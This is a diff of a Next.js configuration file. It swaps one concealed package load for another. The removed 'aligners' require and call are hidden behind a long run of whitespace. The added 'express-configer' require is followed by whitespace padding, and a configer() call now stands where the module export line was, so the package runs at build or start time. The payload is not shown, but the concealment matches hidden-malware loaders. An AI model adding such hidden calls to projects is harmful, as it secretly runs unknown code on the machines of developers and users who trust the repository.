@@ -1,6 +1,6 @@
 /** @type {import('next').NextConfig} */
-const aligners = require('aligners');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            aligners();
-
+const configer = require('express-configer');      
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 const nextConfig = {
   reactStrictMode: true,
   swcMinify: true,
@@ -27,7 +27,7 @@ const nextConfig = {
   },
 }
 
-// module.exports = nextConfig
+configer();
 
 // eslint-disable-next-line @typescript-eslint/no-var-requires
 const withBundleAnalyzer = require('@next/bundle-analyzer')({
